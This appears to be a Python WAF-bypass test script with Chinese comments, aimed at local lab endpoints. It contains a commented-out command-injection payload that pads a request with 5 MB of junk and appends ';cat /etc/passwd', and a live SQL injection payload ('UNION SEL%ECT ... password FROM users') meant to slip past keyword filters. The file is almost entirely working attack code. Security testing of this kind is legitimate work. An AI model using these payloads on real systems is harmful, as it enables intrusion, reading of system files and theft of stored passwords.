# import requests

# headers = {
#     'Host': '127.0.0.1:9004',
#     # 'Content-Length': '23',
#     'Cache-Control': 'max-age=0',
#     'Upgrade-Insecure-Requests': '1',
#     # 'Origin': 'http://127.0.0.1:9004',
#     'Content-Type': 'application/x-www-form-urlencoded',
#     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#     # 'Referer': 'http://127.0.0.1:9004/',
#     # 'Accept-Encoding': 'gzip, deflate, br',
#     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
#     'Connection': 'close',
# }
# padding_data = 'x' * 1024 * 1024 * 5  # 5 MB 的无用数据

# data = {'cmd': 'echo ' + padding_data +';cat /etc/passwd'}


# response = requests.post('http://127.0.0.1:9004/rce_post', headers=headers, data=data, verify=False)
# print(response.text)    
# print(response.status_code)
# 将字符串转换为 Unicode 编码形式
import urllib.parse

def unicode_encode(s):
    return urllib.parse.quote(s)

import requests

headers = {
    # 'Host': 'waf:9001',
    # 'Content-Length': '64',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    # 'Origin': 'http://waf:9001',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    # 'Referer': 'http://waf:9001/',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
    'Connection': 'close',
}

# data = {
#     'id': '1 UNION SELECT null, password FROM users WHERE id = 1 -- ',
# }

raw_string = "1 UNION SEL%ECT null, password FROM users WHERE id = 1 -- "
unicode_string = unicode_encode(raw_string)
unicode_string = raw_string
print(unicode_string)
data = {
    'id': unicode_string,
}

response = requests.post('http://localhost:8001/sqli_post', headers=headers, data=data, verify=False)
print(response.text)    
print(response.status_code)

# # 测试字符串
# test_string = "password"

# # 转换为 Unicode 编码形式
# encoded_password = unicode_encode(test_string)
